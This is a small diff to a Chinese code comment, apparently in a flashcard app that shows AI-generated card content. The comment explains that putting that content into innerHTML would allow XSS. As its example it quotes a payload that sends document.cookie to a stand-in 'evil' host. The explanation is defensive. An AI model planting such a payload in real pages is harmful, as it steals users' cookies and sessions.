@@ -6,7 +6,8 @@
  * ══════════════════════════════════════════════════════════
  *
  * 卡片内容是 AI 生成的（录入时由模型拆知识点、写例句）。如果直接
- * `el.innerHTML = block.content`，那么一条 `<img src=x onerror=fetch('//evil/'+document.cookie)>`
+ * 把 `block.content` 当作元素的 `innerHTML` 赋进去，那么一条
+ * `<img src=x onerror=fetch('//evil/'+document.cookie)>`
  * 就能在用户打开卡片的瞬间发请求、偷数据。
  *
  * 所以这个文件里：
